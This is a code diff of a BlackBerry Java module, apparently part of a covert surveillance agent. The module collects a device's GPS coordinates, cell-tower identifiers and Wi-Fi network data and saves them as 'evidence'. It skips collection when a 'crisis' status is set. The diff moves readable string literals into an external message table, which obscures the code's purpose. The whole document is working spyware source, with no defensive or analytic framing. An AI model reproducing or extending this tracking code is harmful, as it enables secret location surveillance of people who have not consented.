@@ -26,6 +26,7 @@ import net.rim.device.api.system.WLANInfo;
 import net.rim.device.api.system.WLANInfo.WLANAPInfo;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
+import blackberry.Messages;
 import blackberry.Status;
 import blackberry.config.Cfg;
 import blackberry.config.ConfModule;
@@ -46,7 +47,7 @@ import blackberry.utils.Utils;
 public final class ModulePosition extends BaseInstantModule implements
         LocationObserver {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModPosition", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModPosition", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private static final int TYPE_GPS = 1;
@@ -79,19 +80,19 @@ public final class ModulePosition extends BaseInstantModule implements
     //boolean waitingForPoint = false;
 
     public static String getStaticType() {
-        return "position";
+        return Messages.getString("16.0"); //$NON-NLS-1$
     }
 
     public boolean parse(ConfModule conf) {
 
         try {
-            gpsEnabled = conf.getBoolean("gps");
-            cellEnabled = conf.getBoolean("cell");
-            wifiEnabled = conf.getBoolean("wifi");
+            gpsEnabled = conf.getBoolean(Messages.getString("16.1")); //$NON-NLS-1$
+            cellEnabled = conf.getBoolean(Messages.getString("16.2")); //$NON-NLS-1$
+            wifiEnabled = conf.getBoolean(Messages.getString("16.3")); //$NON-NLS-1$
         } catch (ConfigurationException e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("parse");
+            debug.error("parse"); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -118,51 +119,51 @@ public final class ModulePosition extends BaseInstantModule implements
      */
     public void actualStart() {
         //#ifdef DEBUG
-        debug.trace("actualStart");
+        debug.trace("actualStart"); //$NON-NLS-1$
         //#endif
 
         if (gpsEnabled) {
             //#ifdef DEBUG
-            debug.trace("actualRun: gps");
+            debug.trace("actualRun: gps"); //$NON-NLS-1$
             //#endif
             try {
                 locationGPS();
             } catch (Exception e) {
                 //#ifdef DEBUG
                 debug.error(e);
-                debug.error("actualStart locationGPS");
+                debug.error("actualStart locationGPS"); //$NON-NLS-1$
                 //#endif
             }
         }
         if (cellEnabled) {
             //#ifdef DEBUG
-            debug.trace("actualRun: cell");
+            debug.trace("actualRun: cell"); //$NON-NLS-1$
             //#endif
             try {
                 locationCELL();
             } catch (Exception e) {
                 //#ifdef DEBUG
                 debug.error(e);
-                debug.error("actualStart locationCELL");
+                debug.error("actualStart locationCELL"); //$NON-NLS-1$
                 //#endif
             }
         }
         if (wifiEnabled) {
             //#ifdef DEBUG
-            debug.trace("actualRun: wifi");
+            debug.trace("actualRun: wifi"); //$NON-NLS-1$
             //#endif
             try {
                 locationWIFI();
             } catch (Exception e) {
                 //#ifdef DEBUG
                 debug.error(e);
-                debug.error("actualStart locationWIFI");
+                debug.error("actualStart locationWIFI"); //$NON-NLS-1$
                 //#endif
             }
         }
 
         //#ifdef DEBUG
-        debug.trace("actualStart End");
+        debug.trace("actualStart End"); //$NON-NLS-1$
         //#endif
     }
 
@@ -191,19 +192,19 @@ public final class ModulePosition extends BaseInstantModule implements
 
     private void locationGPS() {
         //#ifdef DEBUG
-        debug.trace("locationGPS");
+        debug.trace("locationGPS"); //$NON-NLS-1$
         //#endif
 
         if (Status.self().crisisPosition()) {
             //#ifdef DEBUG
-            debug.trace("locationGPS: crisis");
+            debug.trace("locationGPS: crisis"); //$NON-NLS-1$
             //#endif
             return;
         }
 
         if (!Device.getInstance().hasGPS()) {
             //#ifdef DEBUG
-            debug.error("locationGPS: doesn't have GPS");
+            debug.error("locationGPS: doesn't have GPS"); //$NON-NLS-1$
             //#endif
             gpsEnabled = false;
             return;
@@ -212,7 +213,7 @@ public final class ModulePosition extends BaseInstantModule implements
         synchronized (this) {
             if (alarm != null) {
                 //#ifdef DEBUG
-                debug.trace("locationGPS: canceling alarm");
+                debug.trace("locationGPS: canceling alarm"); //$NON-NLS-1$
                 //#endif
                 alarm.cancel();
             }
@@ -223,27 +224,27 @@ public final class ModulePosition extends BaseInstantModule implements
 
             if (!waitingForPoint) {
                 //#ifdef DEBUG
-                debug.trace("locationGPS, not waiting, start location get");
+                debug.trace("locationGPS, not waiting, start location get"); //$NON-NLS-1$
                 //#endif
 
                 LocationHelper.getInstance().reset();
                 LocationHelper.getInstance().start(this, false);
             } else {
                 //#ifdef DEBUG
-                debug.trace("locationGPS, waiting for point");
+                debug.trace("locationGPS, waiting for point"); //$NON-NLS-1$
                 //#endif
             }
         }
 
         //#ifdef DEBUG
-        debug.trace("locationGPS: end");
+        debug.trace("locationGPS: end"); //$NON-NLS-1$
         //#endif
     }
 
     public void stopGps() {
         try {
             //#ifdef DEBUG
-            debug.trace("stopGps");
+            debug.trace("stopGps"); //$NON-NLS-1$
             //#endif
 
             alarm.cancel();
@@ -253,7 +254,7 @@ public final class ModulePosition extends BaseInstantModule implements
         } catch (Exception ex) {
             //#ifdef DEBUG
             debug.error(ex);
-            debug.error("stopGps");
+            debug.error("stopGps"); //$NON-NLS-1$
             //#endif
         }
     }
@@ -263,7 +264,7 @@ public final class ModulePosition extends BaseInstantModule implements
         if (wifi != null) {
             if ((RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0) {
                 //#ifdef DEBUG
-                debug.info("Wifi: " + wifi.getBSSID());
+                debug.info("Wifi: " + wifi.getBSSID()); //$NON-NLS-1$
                 //#endif
                 final byte[] payload = getWifiPayload(wifi.getBSSID(),
                         wifi.getSSID(), wifi.getSignalLevel());
@@ -274,7 +275,7 @@ public final class ModulePosition extends BaseInstantModule implements
             }
         } else {
             //#ifdef DEBUG
-            debug.warn("Wifi disabled");
+            debug.warn("Wifi disabled"); //$NON-NLS-1$
             //#endif
         }
 
@@ -287,7 +288,7 @@ public final class ModulePosition extends BaseInstantModule implements
         if (Device.isGPRS()) {
             if (!Device.isSimEnabled()) {
                 //#ifdef DEBUG
-                debug.trace("locationCELL: sim not present");
+                debug.trace("locationCELL: sim not present"); //$NON-NLS-1$
                 //#endif
                 return;
             }
@@ -298,7 +299,7 @@ public final class ModulePosition extends BaseInstantModule implements
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
             //#ifdef DEBUG
-            debug.trace("mcc: " + cellinfo.getMCC() + "/"
+            debug.trace(Messages.getString("16.11") + cellinfo.getMCC() + "/" //$NON-NLS-1$ //$NON-NLS-2$
                     + GPRSInfo.getHomeMCC());
             /*
              * Evidence.info("mcc cellinfo=" + cellinfo.getMCC() + " homeMCC=" +
@@ -321,10 +322,10 @@ public final class ModulePosition extends BaseInstantModule implements
             final int rssi = RadioInfo.getSignalLevel();
 
             final StringBuffer mb = new StringBuffer();
-            mb.append("MCC: " + mcc);
-            mb.append(" MNC: " + mnc);
-            mb.append(" LAC: " + lac);
-            mb.append(" CID: " + cid);
+            mb.append(Messages.getString("16.4") + mcc); //$NON-NLS-1$
+            mb.append(Messages.getString("16.5") + mnc); //$NON-NLS-1$
+            mb.append(Messages.getString("16.6") + lac); //$NON-NLS-1$
+            mb.append(Messages.getString("16.7") + cid); //$NON-NLS-1$
             //#ifdef DEBUG
             debug.info(mb.toString());
             //#endif
@@ -350,9 +351,9 @@ public final class ModulePosition extends BaseInstantModule implements
             final int rssi = RadioInfo.getSignalLevel();
 
             final StringBuffer mb = new StringBuffer();
-            mb.append("SID: " + sid);
-            mb.append(" NID: " + nid);
-            mb.append(" BID: " + bid);
+            mb.append(Messages.getString("16.8") + sid); //$NON-NLS-1$
+            mb.append(Messages.getString("16.9") + nid); //$NON-NLS-1$
+            mb.append(Messages.getString("16.10") + bid); //$NON-NLS-1$
 
             //#ifdef DEBUG
             debug.info(mb.toString());
@@ -367,11 +368,11 @@ public final class ModulePosition extends BaseInstantModule implements
         } else if (Device.isIDEN()) {
             //TODO IDEN
             //#ifdef DEBUG
-            debug.error("locationCELL: IDEN not supported");
+            debug.error("locationCELL: IDEN not supported"); //$NON-NLS-1$
             //#endif
         } else {
             //#ifdef DEBUG
-            debug.error("locationCELL: not supported");
+            debug.error("locationCELL: not supported"); //$NON-NLS-1$
             //#endif
         }
 
@@ -379,16 +380,16 @@ public final class ModulePosition extends BaseInstantModule implements
 
     public void newLocation(Location loc) {
         //#ifdef DEBUG
-        debug.trace("newLocation");
+        debug.trace("newLocation"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DBC
-        Check.requires(logGps != null, "logGps == null");
+        Check.requires(logGps != null, "logGps == null"); //$NON-NLS-1$
         //#endif
 
         if (loc == null) {
             //#ifdef DEBUG
-            debug.error("Error in getLocation");
+            debug.error("Error in getLocation"); //$NON-NLS-1$
             //#endif  
             return;
         }
@@ -399,7 +400,7 @@ public final class ModulePosition extends BaseInstantModule implements
         final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
         if (qc == null) {
             //#ifdef DEBUG
-            debug.error("Cannot get QualifiedCoordinates");
+            debug.error("Cannot get QualifiedCoordinates"); //$NON-NLS-1$
             //#endif
             return;
         }
@@ -408,7 +409,7 @@ public final class ModulePosition extends BaseInstantModule implements
 
         if (loc.isValid()) {
             //#ifdef DEBUG
-            debug.trace("valid");
+            debug.trace("valid"); //$NON-NLS-1$
             //#endif
             final byte[] payload = getGPSPayload(qc, loc, timestamp);
 
@@ -436,7 +437,7 @@ public final class ModulePosition extends BaseInstantModule implements
 
         //#ifdef DBC
         Check.ensures(addbuffer.getPosition() == addsize,
-                "addbuffer wrong size");
+                "addbuffer wrong size"); //$NON-NLS-1$
         //#endif
 
         return additionalData;
@@ -445,11 +446,11 @@ public final class ModulePosition extends BaseInstantModule implements
     private void saveEvidence(Evidence acutalEvidence, byte[] payload, int type) {
 
         //#ifdef DBC
-        Check.requires(payload != null, "saveEvidence payload!= null");
+        Check.requires(payload != null, "saveEvidence payload!= null"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveEvidence payload: " + payload.length);
+        debug.trace("saveEvidence payload: " + payload.length); //$NON-NLS-1$
         //#endif
 
         final int version = 2008121901;
@@ -476,7 +477,7 @@ public final class ModulePosition extends BaseInstantModule implements
 
         //#ifdef DBC
         Check.ensures(databuffer.getPosition() == size,
-                "saveEvidence wrong size");
+                "saveEvidence wrong size"); //$NON-NLS-1$
         //#endif
 
         // save log
@@ -486,8 +487,8 @@ public final class ModulePosition extends BaseInstantModule implements
 
     private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
         //#ifdef DEBUG
-        debug.trace("getWifiPayload bssid: " + bssid + " ssid: " + ssid
-                + " signal:" + signalLevel);
+        debug.trace("getWifiPayload bssid: " + bssid + " ssid: " + ssid //$NON-NLS-1$ //$NON-NLS-2$
+                + " signal:" + signalLevel); //$NON-NLS-1$
         //#endif
         final int size = 48;
         final byte[] payload = new byte[size];
@@ -503,7 +504,7 @@ public final class ModulePosition extends BaseInstantModule implements
             //#endif
 
             //#ifdef DBC
-            Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
+            Check.asserts(token.length == 1, "getWifiPayload: token wrong size"); //$NON-NLS-1$
             //#endif
             databuffer.writeByte(token[0]);
         }
@@ -521,7 +522,7 @@ public final class ModulePosition extends BaseInstantModule implements
         }
 
         //#ifdef DEBUG
-        debug.trace("getWifiPayload ssidcontent.length: " + ssidcontent.length);
+        debug.trace("getWifiPayload ssidcontent.length: " + ssidcontent.length); //$NON-NLS-1$
         //#endif
         databuffer.writeInt(ssidcontent.length);
 
@@ -531,11 +532,11 @@ public final class ModulePosition extends BaseInstantModule implements
 
         //#ifdef DBC
         Check.ensures(databuffer.getPosition() == size,
-                "databuffer.getPosition wrong size");
+                "databuffer.getPosition wrong size"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DBC
-        Check.ensures(payload.length == size, "payload wrong size");
+        Check.ensures(payload.length == size, "payload wrong size"); //$NON-NLS-1$
         //#endif
 
         return payload;
@@ -579,7 +580,7 @@ public final class ModulePosition extends BaseInstantModule implements
 
         //#ifdef DBC
         Check.ensures(databuffer.getLength() == size,
-                "getCellPayload wrong size");
+                "getCellPayload wrong size"); //$NON-NLS-1$
         //#endif
 
         return cellPosition;
@@ -592,7 +593,7 @@ public final class ModulePosition extends BaseInstantModule implements
     private byte[] getGPSPayload(QualifiedCoordinates qc, Location loc,
             long timestamp) {
         //#ifdef DEBUG
-        debug.trace("getGPSPayload");
+        debug.trace("getGPSPayload"); //$NON-NLS-1$
         //#endif
         final Date date = new Date(timestamp);
 
@@ -605,8 +606,8 @@ public final class ModulePosition extends BaseInstantModule implements
         final float course = loc.getCourse();
 
         //#ifdef DEBUG
-        debug.info("" + " " + speed + "|" + latitude + "|" + longitude + "|"
-                + course + "|" + date);
+        debug.info("" + " " + speed + "|" + latitude + "|" + longitude + "|" //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$
+                + course + "|" + date); //$NON-NLS-1$
         //#endif
 
         final DateTime dateTime = new DateTime(date);
@@ -664,12 +665,12 @@ public final class ModulePosition extends BaseInstantModule implements
         databuffer.write(new byte[48]); // sn view
 
         //#ifdef DEBUG
-        debug.trace("len: " + databuffer.getPosition());
+        debug.trace("len: " + databuffer.getPosition()); //$NON-NLS-1$
         //#endif
 
         //#ifdef DBC
         Check.ensures(databuffer.getPosition() == size,
-                "saveGPSLog wrong size: " + databuffer.getPosition());
+                "saveGPSLog wrong size: " + databuffer.getPosition()); //$NON-NLS-1$
         //#endif
 
         return gpsPosition;
@@ -691,23 +692,23 @@ public final class ModulePosition extends BaseInstantModule implements
                 gpsEnabled = ((type & TYPE_GPS) != 0);
             } else {
                 //#ifdef DEBUG
-                debug.warn("GPS Disabled at compile time");
+                debug.warn("GPS Disabled at compile time"); //$NON-NLS-1$
                 //#endif
             }
             cellEnabled = ((type & TYPE_CELL) != 0);
             wifiEnabled = ((type & TYPE_WIFI) != 0);
 
             //#ifdef DBC
-            Check.asserts(period > 0, "parse period: " + period);
+            Check.asserts(period > 0, "parse period: " + period); //$NON-NLS-1$
             // Check.asserts(type == 1 || type == 2 || type == 4, "parse type: " + type);
             //#endif
 
             //#ifdef DEBUG
-            debug.info("Type: " + type);
-            debug.info("Period: " + period);
-            debug.info("gpsEnabled: " + gpsEnabled);
-            debug.info("cellEnabled: " + cellEnabled);
-            debug.info("wifiEnabled: " + wifiEnabled);
+            debug.info("Type: " + type); //$NON-NLS-1$
+            debug.info("Period: " + period); //$NON-NLS-1$
+            debug.info("gpsEnabled: " + gpsEnabled); //$NON-NLS-1$
+            debug.info("cellEnabled: " + cellEnabled); //$NON-NLS-1$
+            debug.info("wifiEnabled: " + wifiEnabled); //$NON-NLS-1$
             //#endif
 
             setPeriod(period);
@@ -725,14 +726,14 @@ public final class ModulePosition extends BaseInstantModule implements
 
     public void waitingForPoint(boolean b) {
         //#ifdef DEBUG
-        debug.trace("waitingForPoint: " + b);
+        debug.trace("waitingForPoint: " + b); //$NON-NLS-1$
         //#endif
         waitingForPoint = b;
     }
 
     public void errorLocation(boolean interrupted) {
         //#ifdef DEBUG
-        debug.error("errorLocation");
+        debug.error("errorLocation"); //$NON-NLS-1$
         //#endif
         waitingForPoint(false);
     }
